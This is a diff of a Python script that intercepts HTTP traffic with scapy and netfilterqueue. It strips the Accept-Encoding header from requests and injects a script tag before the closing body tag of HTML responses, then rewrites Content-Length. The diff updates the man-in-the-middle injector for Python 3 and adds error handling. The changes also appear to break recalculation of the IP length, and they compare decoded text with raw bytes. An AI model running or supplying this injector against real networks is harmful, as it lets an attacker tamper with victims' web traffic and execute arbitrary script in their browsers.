@@ -12,46 +12,43 @@ injection_code = "<script>alert('Test!'); </script>"
 
 def set_load(packet, load):
     packet[Raw].load = load
-    # For scapy to recalculate IP and Chksum for updated load, delete them
-    # Making the change from del, to *= None, does not affect the results
-    del packet[IP].len
     del packet[IP].chksum
     del packet[TCP].chksum
-    if packet.haslayer(UDP):
-        del packet[UDP].len
-        del packet[UDP].chksum
     return packet
 
 def process_packet(packet):
     scapy_packet= IP(packet.get_payload())
     if scapy_packet.haslayer(Raw):
-        load = scapy_packet[Raw].load
-        if scapy_packet.haslayer(TCP):
-            if scapy_packet[TCP].dport == 80:
-                print("[+] HTTP Request:  ")
-                load = re.sub(
-                    "Accept-Encoding:.*?\\r\\n",
-                    "",
-                    load,
-                    flags=re.IGNORECASE | re.MULTILINE
-                )
+        try:
+            load = scapy_packet[Raw].load.decode()
 
-            elif scapy_packet[TCP].sport == 80:
-                print("[+] HTTP Response:  ")
+            if scapy_packet.haslayer(TCP) and scapy_packet[TCP].dport == 80:
+                print("[+] HTTP Request Intercepted:  ")
+                load = re.sub("Accept-Encoding:.*?\\r\\n", "", load)
+
+            elif scapy_packet.haslayer(TCP) and scapy_packet[TCP].sport == 80:
+                print("[+] HTTP Response Intercepted:  ")
                 load = load.replace("</body>", injection_code + "</body>")
                 content_length_search = re.search("(?:Content-Length:\s)(\d*)", load)
-                if content_length_search:
+                if content_length_search and "text/html" in load:
                     content_length = content_length_search.group(1)
                     new_content_length = int(content_length) + len(injection_code)
                     load = load.replace(content_length, str(new_content_length))
 
-            if load != scapy_packet[Raw].load:
-                new_packet = set_load(scapy_packet, load)
-                packet.set_payload(str(new_packet))
+                if load != scapy_packet[Raw].load:
+                    new_packet = set_load(scapy_packet, load)
+                    packet.set_payload(bytes(new_packet))
+        except UnicodeDecodeError:
+            pass
 
     packet.accept()
 
+
 if __name__ == "__main__":
-    queue = netfilterqueue.NetfilterQueue()
-    queue.bind(0, process_packet)
-    queue.run()
+    try:
+        print("[*] Initializing NetfilterQueue...")
+        queue = netfilterqueue.NetfilterQueue()
+        queue.bind(3, process_packet)
+        queue.run()
+    except KeyboardInterrupt:
+        print("\n[!] Ctrl+C detected. Unbinding queue and exiting...")
